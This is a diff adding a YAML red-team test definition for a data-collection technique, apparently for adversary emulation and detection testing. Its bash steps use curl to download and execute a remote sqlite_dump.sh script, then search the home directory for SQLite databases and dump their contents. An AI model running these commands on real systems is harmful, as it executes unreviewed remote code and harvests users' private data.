@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Find and dump sqlite databases (Linux)
+description: |
+    An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
+args:
+    - name: remote_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
+uuid: 00cbb875-7ae4-4cf1-b638-e543fd825300
+mitre:
+    tactics:
+        - 'TA0009: Collection'
+    techniques:
+        - 'T1005: Data from Local System'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: find-and-dump-sqlite-databases-(linux)
+      inline: |
+        cd $HOME
+        curl -O {{.Args.remote_url}}/art
+        curl -O {{.Args.remote_url}}/gta.db
+        curl -O {{.Args.remote_url}}/sqlite_dump.sh
+        chmod +x sqlite_dump.sh
+        find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+      executor: bash
+      cleanup:
+        inline: "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n"
+        executor: bash
